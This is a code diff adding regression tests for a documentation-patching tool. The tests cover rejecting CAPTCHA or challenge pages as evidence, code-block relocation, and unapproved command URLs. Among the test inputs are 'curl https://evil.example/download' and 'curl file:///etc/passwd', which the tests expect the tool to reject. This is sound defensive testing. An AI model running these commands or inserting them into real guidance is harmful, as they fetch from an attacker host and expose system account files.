@@ -739,6 +739,131 @@ describe("patch approval and recovery", () => {
 });
 
 describe("review regressions", () => {
+  it.each([
+    "CAPTCHA",
+    "Access denied",
+    "Sign in to continue",
+    "Checking your browser",
+  ])("rejects long HTTP 200 challenge evidence containing %s", (indicator) => {
+    const evidence = normalizeEvidence(
+      sourceUrl,
+      {
+        ...payload,
+        markdown: "Interstitial boilerplate. ".repeat(100) + indicator,
+      },
+      policy,
+    );
+    expect(evidence.outcome).toBe("unverifiable");
+    expect(evidenceFresh(evidence, policy)).toBe(false);
+  });
+  it.each(["```sh\nold-command\n```", "    old-command"])(
+    "rejects non-command code relocation and permits prose before %s",
+    async (block) => {
+      const { root } = await fixture();
+      const text = source
+        .replace("Old guidance.", "Introduction.")
+        .replace("```sh\nold-command\n```", `Before.\n\n${block}\n\nAfter.`);
+      await writeFile(path.join(root, file), text);
+      const run = await startRun(root, "code-relocation", policy, [
+        { url: "/guide/", sources: [sourceUrl] },
+      ]);
+      await scan(root, run, policy, { captures: [capture()] });
+      for (const update of [
+        {
+          original: `Before.\n\n${block}`,
+          replacement: `${block}\n\nCorrected.`,
+        },
+        {
+          kind: "notice",
+          original: `${block}\n\nAfter.`,
+          replacement: `2026-10-07: Update.\n\n${block}\n\nAfter.`,
+        },
+      ]) {
+        run.findings = validateFindings(
+          { findings: [finding(run, update)] },
+          run,
+          policy,
+        );
+        await expect(createPatches(root, run, policy)).rejects.toThrow(
+          "explicit command finding",
+        );
+      }
+      run.findings = validateFindings(
+        {
+          findings: [
+            finding(run, {
+              original: "Introduction.",
+              replacement: "Longer introduction.\n\nMore context.",
+            }),
+          ],
+        },
+        run,
+        policy,
+      );
+      expect((await createPatches(root, run, policy))[0].after).toContain(
+        block,
+      );
+    },
+  );
+  it.each([
+    ["curl https://evil.example/download", "outside the approved"],
+    [
+      "git clone https://docs.example.com/unverified",
+      "fresh successful evidence",
+    ],
+    ["curl file:///etc/passwd", "outside the approved"],
+  ])(
+    "rejects an unverified command destination: %s",
+    async (replacement, error) => {
+      const { root, run } = await fixture();
+      await propose(root, run, policy, {
+        findings: [
+          finding(run, {
+            kind: "command",
+            original: "old-command",
+            replacement,
+          }),
+        ],
+      });
+      await expect(createPatches(root, run, policy)).rejects.toThrow(error);
+    },
+  );
+  it("validates assembled command URLs after substring edits and permits verified destinations", async () => {
+    const { root } = await fixture();
+    await writeFile(
+      path.join(root, file),
+      source.replace("old-command", 'curl "https://docs.example.com/old-path"'),
+    );
+    const run = await startRun(root, "command-url", policy, [
+      { url: "/guide/", sources: [sourceUrl] },
+    ]);
+    await scan(root, run, policy, { captures: [capture()] });
+    for (const replacement of ["unverified", "guide"]) {
+      run.findings = validateFindings(
+        {
+          findings: [
+            finding(run, {
+              kind: "command",
+              original: "old-path",
+              replacement,
+            }),
+          ],
+        },
+        run,
+        policy,
+      );
+      if (replacement === "unverified") {
+        await expect(createPatches(root, run, policy)).rejects.toThrow(
+          "fresh successful evidence",
+        );
+      } else {
+        const patches = await createPatches(root, run, policy);
+        expect(patches[0].after).toContain(`curl "${sourceUrl}"`);
+        expect(patches[0].sensitive).toBe(true);
+      }
+    }
+  });
+
   it("isolates malformed captures and rejects a non-array import before scanning", async () => {
     const { root } = await fixture();
     const run = await startRun(root, "imports", policy, [
